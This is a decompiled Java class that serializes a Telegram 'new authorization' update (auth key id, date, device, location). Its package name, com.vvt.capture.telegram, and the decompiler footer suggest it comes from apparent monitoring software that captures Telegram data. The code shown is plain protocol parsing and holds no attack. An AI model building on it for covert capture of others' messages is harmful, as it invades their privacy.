package com.vvt.capture.telegram.internal;

public class TLRPC$TL_updateNewAuthorization
  extends TLRPC.Update
{
  public static int constructor = -1895411046;
  
  public void readParams(AbstractSerializedData paramAbstractSerializedData, boolean paramBoolean)
  {
    long l = paramAbstractSerializedData.readInt64(paramBoolean);
    this.auth_key_id = l;
    int i = paramAbstractSerializedData.readInt32(paramBoolean);
    this.date = i;
    String str = paramAbstractSerializedData.readString(paramBoolean);
    this.device = str;
    str = paramAbstractSerializedData.readString(paramBoolean);
    this.location = str;
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    long l = this.auth_key_id;
    paramAbstractSerializedData.writeInt64(l);
    i = this.date;
    paramAbstractSerializedData.writeInt32(i);
    String str = this.device;
    paramAbstractSerializedData.writeString(str);
    str = this.location;
    paramAbstractSerializedData.writeString(str);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_updateNewAuthorization.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */